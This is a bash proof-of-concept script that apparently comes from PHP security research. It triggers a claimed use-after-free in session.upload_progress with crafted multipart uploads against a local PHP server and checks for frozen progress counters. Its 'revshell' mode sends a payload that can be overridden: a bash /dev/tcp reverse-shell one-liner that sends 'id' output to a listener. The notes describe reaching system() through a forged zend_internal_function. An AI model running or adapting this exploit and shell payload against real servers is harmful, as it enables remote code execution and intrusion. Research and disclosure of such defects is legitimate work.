#!/usr/bin/env bash
# Staleness repro (forensics) - progress-counter signature in session.upload_progress.
# (Our bug is an uncatalogued upstream staleness defect, NOT the shipped CVE pair - see README.)
# Modes:
#   bash run.sh                                  -> forensics (progress-counter signature)
#   bash run.sh revshell [phpport] [rport]       -> + reverse-shell payload endgame (simulated sink)
# Env overrides: PAYLOAD=... (payload string). Port defaults: PHP 8019, listener 4455.
# Requires: php-cli 8.x (any build >= 5.4), curl, python3. Loopback only.
set -e
d="$(cd "$(dirname "$0")" && pwd)"
MODE="${1:-forensics}"
if [ "$MODE" = "revshell" ]; then PORT="${2:-8019}"; RPORT="${3:-4455}"
else PORT="${1:-8019}"; RPORT=4455; fi
rm -f "$d"/sess_* "$d"/listen_out.txt
python3 "$d/gen_bodies.py" > /dev/null
PHP_CLI_SERVER_WORKERS=4 php -d session.save_path="$d" \
  -d session.upload_progress.enabled=1 \
  -d session.upload_progress.cleanup=0 \
  -d session.upload_progress.min_freq=0.05 \
  -d session.use_only_cookies=0 \
  -S 127.0.0.1:$PORT -t "$d" "$d/router.php" > "$d/server.log" 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT
for i in $(seq 40); do
  curl -s -o /dev/null "http://127.0.0.1:$PORT/" 2>/dev/null || sleep 0.25
  if grep -q started "$d/server.log" 2>/dev/null; then break; fi
done
up() { curl -s -o /dev/null --data-binary @"$d/$1" \
  -H 'Content-Type: multipart/form-data; boundary=POCBND' \
  "http://127.0.0.1:$PORT/?PHPSESSID=$2"; }

if [ "$MODE" = "revshell" ]; then
  # corrupt the progress tree first (spray upload), then ride the payload on a
  # follow-up request in the same session — the stall/resume shape of the trigger
  up spray.bin cspray
  V=$(php -r 'echo PHP_VERSION;')
  PAYLOAD="${PAYLOAD:-bash -c 'exec 3<>/dev/tcp/127.0.0.1/$RPORT; { id; echo php$V-revshell-OK; } >&3'}"
  echo; echo "payload: $PAYLOAD"
  python3 "$d/listen.py" 127.0.0.1 "$RPORT" 8 > "$d/listen_out.txt" 2>/dev/null &
  LP=$!
  sleep 0.4
  curl -s -o "$d/payload_resp.txt" "http://127.0.0.1:$PORT/?PHPSESSID=cspray" \
    --data "exec=1" --data-urlencode "payload=$PAYLOAD"
  rc=0; wait $LP || rc=$?
  if [ "$rc" = 3 ]; then
    echo "revshell: TIMEOUT — no connection hit 127.0.0.1:$RPORT"
  elif [ -s "$d/listen_out.txt" ]; then
    echo "revshell: CONNECTED — listener on :$RPORT received:"
    sed 's/^/  /' "$d/listen_out.txt"
  else
    echo "revshell: listener accepted but received no data"
  fi
  echo
  echo "Endgame note: system() ran in a stock PHP request handler (simulated sink)."
  echo "The researcher's chain reaches the same sink from the UAF write via a forged"
  echo "zend_internal_function -> zend_call_function. Loopback only; payload override:"
  echo "  PAYLOAD='...' bash run.sh revshell"
  exit 0
fi

up small.bin csmall
up big.bin cbig
up spray.bin cspray
report() {
  local f="$d/sess_$2" name="$1" real="$3"
  local bp
  bp=$(grep -ao 'bytes_processed";i:[0-9]*' "$f" 2>/dev/null | head -1 | grep -ao '[0-9]*$')
  local verdict
  if [ "${bp:-NONE}" = "$real" ]; then verdict="CORRECT (self-healed or no churn)";
  elif [ -z "${bp:-}" ]; then verdict="NO PROGRESS TREE (tracking off?)";
  else verdict="STALE/FROZEN COUNTER  <-- UAF store lost (spray reclaimed the freed bucket)"; fi
  printf '%-10s real_size=%-7s recorded_bytes_processed=%-8s %s\n' "$name" "$real" "${bp:-NONE}" "$verdict"
}
echo
echo "== session.upload_progress progress counter vs real POST size:"
report small csmall 4308
report big cbig 200212
report spray cspray 516112
echo
echo "Note: small/big self-heal (zend allocator returns the freed chunk to the
re-decode itself); spray.bin's 150 x[] fields reclaim it, so stores through the
dangling bucket pointer stop reaching the live tree. Expect spray line to show
~205318 frozen value on unpatched 8.3.6. The 2026-10-21 vendor fixes (8.3.36) do NOT change this value - the
staleness survives them byte-identically (A/B-verified); it is our bug, not the CVE pair. Cleanup removes progress with cleanup=1 (PHP default).
SID must be discoverable during request-start parsing: GET ?PHPSESSID= with
session.use_only_cookies=0 (cookie header alone is not visible in that phase
on 8.3)."
